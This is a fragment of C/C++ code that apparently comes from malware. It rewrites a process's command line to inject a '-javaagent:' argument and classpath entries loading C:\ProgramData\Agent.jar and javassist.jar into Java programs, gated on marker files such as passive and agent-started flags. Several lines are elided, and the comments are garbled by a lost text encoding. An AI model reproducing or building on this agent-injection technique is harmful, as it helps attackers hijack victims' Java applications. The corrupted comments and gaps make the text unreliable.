...
//	const char* forIns1 = " -javaagent:\"%s\\%s\""; 
	...
	if( m_strstr( CommandLineA, "javassist.jar" ) != 0 ) //���� ��� ���������, �� 2-� ��� �� �����
		return CommandLineA;

	char* p1 = m_strstr( CommandLineA, find1 );
	if( p1 == 0 ) return CommandLineA; //������ ������
	...
	if( (DWORD)pGetFileAttributesA(uidTxt.str()) == INVALID_FILE_ATTRIBUTES ) //���� ����� ���, �� ������ �� ������
		return CommandLineA;
		...
		if( p1 )
		{
			...
			if( File::IsExists(agentStartedDat) && !File::IsExists(agentWorkingDat) )
				...
				if( File::IsExists(passiveDat) )
					agent = agentPassive;
			//������� "-javaagent:C:\ProgramData\Agent.jar "
			int sz1 = a ? pwsprintfA( ins1, forIns1, allUsers.str(), a ) : 0;
			//������� ";C:\ProgramData\Agent.jar;C:\ProgramData\lib\javassist.jar"
